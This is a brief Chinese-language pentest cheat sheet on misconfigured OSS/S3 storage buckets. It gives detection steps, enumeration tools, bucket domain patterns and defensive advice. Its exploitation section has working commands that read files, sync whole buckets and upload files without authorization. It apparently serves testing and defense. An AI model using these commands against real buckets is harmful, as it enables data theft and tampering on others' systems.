# OSS 未授权访问

## 检测方法
1. 文件查看、图片查看等界面会直接访问 OSS/S3 存储桶
2. 返回包中泄露了存储桶地址 → 尝试直接访问
3. 浏览器直接访问桶地址看返回（NoSuchKey vs AccessDenied）
4. 使用 Bucket 遍历工具批量扫描

## 测试命令
```bash
# 直接访问桶地址
curl -I http://bucket-name.oss-cn-hangzhou.aliyuncs.com/
curl -I https://s3.amazonaws.com/bucket-name/

# 列举对象
curl http://bucket-name.oss-cn-hangzhou.aliyuncs.com/?prefix=
aws s3 ls s3://bucket-name --no-sign-request

# 批量探测工具
# s3scanner
s3scanner bucket-names.txt

# cloud_enum（多平台）
python3 cloud_enum.py -k target-keyword
```

## 常见存储桶域名
```
阿里云:   bucket.oss-cn-{region}.aliyuncs.com
AWS:      bucket.s3.amazonaws.com
AWS:      bucket.s3-{region}.amazonaws.com
腾讯云:   bucket.cos.ap-{region}.myqcloud.com
七牛云:   bucket.qiniucdn.com
华为云:   bucket.obs.{region}.myhuaweicloud.com
天翼云:   bucket.ctyun.cn
```

## 漏洞利用
```bash
# 读取文件
curl http://bucket.oss-cn-hangzhou.aliyuncs.com/flag.txt
aws s3 cp s3://bucket/flag.txt ./ --no-sign-request

# 递归下载整个桶
aws s3 sync s3://bucket ./local --no-sign-request

# 上传文件（需PUT权限）
curl -X PUT -d "test" http://bucket.oss-cn-hangzhou.aliyuncs.com/test.txt
```

## 防御
```
1. 禁止公共读/写（配置桶策略为私有）
2. 使用预签名 URL 实现临时访问
3. 设置防盗链（Referer 白名单）
4. 启用 OSS/S3 日志记录和监控
5. 定期使用工具扫描公开桶
```